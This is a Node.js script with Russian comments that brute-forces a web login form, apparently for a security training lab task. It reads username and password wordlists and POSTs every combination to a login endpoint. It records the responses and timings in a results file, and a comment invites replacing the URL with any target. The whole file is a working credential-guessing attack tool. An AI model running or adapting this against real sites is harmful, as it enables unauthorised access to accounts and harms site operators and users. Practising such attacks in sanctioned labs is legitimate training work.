const fs = require("fs");
const axios = require('axios');

// Функция для чтения файла и возврата массива строк
function readFileToArray(filePath) {
    try {
        const data = fs.readFileSync(filePath, "utf-8");
        return data.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error(`Error reading file ${filePath}:`, error);
        return [];
    }
}

// Функция для записи результатов в файл
function writeResultToFile(filePath, result) {
    try {
        fs.appendFileSync(filePath, result + "\n", "utf-8");
    } catch (error) {
        console.error(`Error writing to file ${filePath}:`, error);
    }
}

// Функция для отправки HTTP-запроса
async function sendRequest(username, password) {
    const url = "https://task1-enum-6b1adsec-stand3.seccheck.ru/login"; // Замените на целевой URL
    const data = `action=signin&username=${username}&password=${password}`; // Тело запроса


    try {

        const response = await axios.post(url, data, {
		headers: {
        		"Content-Type": "application/x-www-form-urlencoded",
            	}
	});


        const result = `Request: username=${username}, password=${password}\nStatus: ${response.status}\nResponse: ${JSON.stringify(response.data)}\n`;
        console.log(result); // Вывод в консоль
        writeResultToFile("results.txt", result); // Запись в файл
        return result
    } catch (error) {
	const errorResult = `Request: username=${username}, password=${password}\nError: ${error}\n`;
	console.error(errorResult); // Вывод ошибки в консоль
	writeResultToFile("results.txt", errorResult); // Запись ошибки в файл
    }

}

// Основная функция для перебора комбинаций
async function runIntruder() {
    // Чтение списков из файлов
    const usernames = readFileToArray("usernames.txt");
    const passwords = readFileToArray("passwords.txt");

    if (usernames.length === 0 || passwords.length === 0) {
        console.error("Один или оба файла пусты или не найдены.");
        return;
    }

    console.log(`Loaded ${usernames.length} usernames and ${passwords.length} passwords.`);

    // Очистка файла результатов перед началом
    fs.writeFileSync("results.txt", "", "utf-8");

    // Перебор всех комбинаций
    for (let i = 0; i < usernames.length; i++) {
    	const username = usernames[i]
        for (let j = 0; j < passwords.length; j++) {
		const password = passwords[j]

		console.log(`${i+1}/${usernames.length} - ${j+1}/${passwords.length}`)

        const timeStart = Date.now()

		const response = await sendRequest(username, password);
		const timeEnd = Date.now()
		const time = (timeEnd - timeStart) / 1000

		console.log(`${time} s.`)
		if (response) break;
	}
    }

    console.log("All requests completed. Results saved to results.txt.");
}
// Запуск
runIntruder();
